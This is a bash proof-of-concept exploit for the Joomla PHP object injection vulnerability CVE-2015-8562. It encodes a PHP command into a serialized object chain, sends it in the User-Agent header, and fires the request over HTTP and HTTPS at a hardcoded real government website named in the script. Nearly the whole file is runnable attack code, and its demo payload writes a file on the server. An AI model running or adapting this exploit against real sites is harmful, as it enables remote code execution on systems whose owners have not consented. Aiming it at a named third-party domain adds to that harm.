#!/bin/bash
# PoC for Joomla Object Injection
# CVE 2015-8562 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8562)
# by atcasanova
#
# Description
# Joomla! 1.5.x, 2.x, and 3.x before 3.4.6 allow remote attackers to conduct 
# PHP object injection attacks and execute arbitrary PHP code via the HTTP
# User-Agent header, as exploited in the wild in December 2015.

figlet=$(which figlet || echo "/bin/echo")

ord(){
	# ASCII para CHAR
	LC_CTYPE=C printf '%d' "'$1'"
}

encode(){
	string=
	conv="$*"
	i=0;
	while (( $i < ${#conv} ));
	do
		string+="chr($(ord "${conv:$i:1}" | tr -d '\n'))."
		let i++;
	done
	echo ${string::-1}
}

target=www.tesourotransparente.gov.br
hack="system('echo test > /tmp/test');"

end="\xf0\xfd\xfd\xfd";
end=$(echo -ne "$end")
str="}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepi\
eFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"Sim\
plePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\"\
;";
payload="eval($(encode "$hack"));JFactory::getConfig();exit"
str+="s:${#payload}:\"$payload\";"
str+="s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\
\"\cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\
\\0\\0\\0connection\";b:1;}"
str+=$end

echo $str

$figlet HTTP
timeout 10 wget -qO/dev/null --user-agent="$str" "http://$target/"
echo "exit code: $?"

$figlet HTTPS
timeout 10 wget -qO/dev/null --no-check-certificate --user-agent="$str" "https://$target/";
echo "exit code: $?"
